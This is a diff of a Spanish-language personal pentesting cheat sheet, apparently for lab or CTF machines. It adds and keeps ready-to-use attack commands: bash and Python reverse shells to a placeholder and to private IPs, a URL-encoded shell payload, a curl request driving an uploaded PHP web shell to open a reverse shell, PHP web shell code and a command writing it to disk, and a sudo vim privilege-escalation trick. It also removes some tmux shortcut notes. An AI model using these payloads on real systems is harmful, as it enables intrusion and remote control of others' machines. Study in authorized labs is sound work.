@@ -2,6 +2,7 @@
 ```zsh
 # este comando se ralla con vim
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+python -c 'import pty; pty.spawn("/bin/bash")'
 #privesc
 sudo vim
 :!sh or :!bash
@@ -11,12 +12,13 @@ unified - terminal
 script /dev/null -c bash
 ```
 
-```
+```bash
 'bash -c "bash -i >& /dev/tcp/YOUR_IP}/333 0>&1"'
 /bin/bash -c "bash -i >& /dev/tcp/YOUR_IP/333 0>&1"
 /bin/bash -c 'bash -i >& /dev/tcp/10.10.15.8/333 0>&1'
 %2Fbin%2Fbash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.15.8%2F333%200%3E%261'
 /bin/bash -c 'python3 -c '\''import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("YOUR_IP",333)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn("/bin/sh")'\'''
+curl "http://blogger.pg/assets/fonts/blog/wp-content/uploads/2026/08/ptxmumreviurhcn-1787847712.3074.php?cmd=python3+-c+'import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.229\",333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import+pty;pty.spawn(\"/bin/bash\")'"
 ```
 knife - terminal
 ```bash
@@ -33,6 +35,7 @@ nishang
 php
 ```
 <?php echo system($_GET['cmd']); ?>
+echo '<?php system($_GET["cmd"]); ?>' > web_shell.php
 system($_GET['cmd']);
 
 /?p=6&cmd=id
@@ -57,35 +60,5 @@ deactivate
 ```
 dpkg -l | grep -i polkit
 ```
-#### Iniciar y salir
-- **`tmux`**: Inicia una nueva sesión anónima.
-- **`tmux new -s mi_sesion`**: Inicia una sesión nombrada (muy útil para organizar tareas).
-- **`exit`** (o `Ctrl + d`): Cierra el panel o ventana actual. Si cierras todos, la sesión termina.
-### 1. Prefijo y Control General
-- **`Ctrl + a`** : Tecla de prefijo principal.
-- **`Ctrl + a` + `a`** : Cambiar rápidamente a la ventana anterior (_last-window_).
-- **`Ctrl + a` + `r`** : Recargar el archivo de configuración (`~/.tmux.conf`).
-- **`Ctrl + a` + `d`** : Salir de Tmux manteniendo la sesión en segundo plano (_detach_).
-### 2. Gestión de Paneles (Splits y Control)
-- **`Ctrl + a` + `|`** : Dividir el panel **horizontalmente** (crea un panel al lado).
-- **`Ctrl + a` + `-`** : Dividir el panel **verticalmente** (crea un panel abajo).
-- **`Ctrl + a` + `Ctrl + o`** : Rotar/intercambiar paneles cíclicamente.
-- **`Ctrl + a` + `:`** y escribir `kill-pane` : Cerrar/matar un panel a la fuerza (si está congelado).
-- **`exit`** o **`Ctrl + d`** : Cerrar un panel de forma normal.
-### 3. Navegación y Gestión de Ventanas (_Tabs_)
-- **`Ctrl + PageDown`** : Ir a la ventana siguiente.
-- **`Ctrl + PageUp`** : Ir a la ventana anterior.
-### 4. Modo Copia y Vi-Mode
-- **`Ctrl + a` + `Enter`** : Entrar en modo copia y subir una línea.
-- **`v`** _(en modo copia)_ : Comenzar la selección de texto (_begin-selection_).
-- **`y`** _(en modo copia)_ : Copiar texto seleccionado al portapapeles.
-- **`Ctrl + v`** _(en modo copia)_ : Activar selección en bloque/rectángulo.
-- **`Escape`** : Cancelar el modo copia.
-### 5. Recuperación y Sesiones (Fuera de Tmux)
-- **`tmux attach`** : Volver a entrar a la última sesión activa en segundo plano.
-- **`tmux ls`** : Listar todas las sesiones de Tmux abiertas.
-- **`tmux attach -t <nombre>`** : Entrar a una sesión específica por su nombre o número.
-- **`tmux kill-session -t ABC`** : eliminacion 
 
-- **`tmux set-environment -t ABC MI_VARIABLE "mi_valor"`**
 
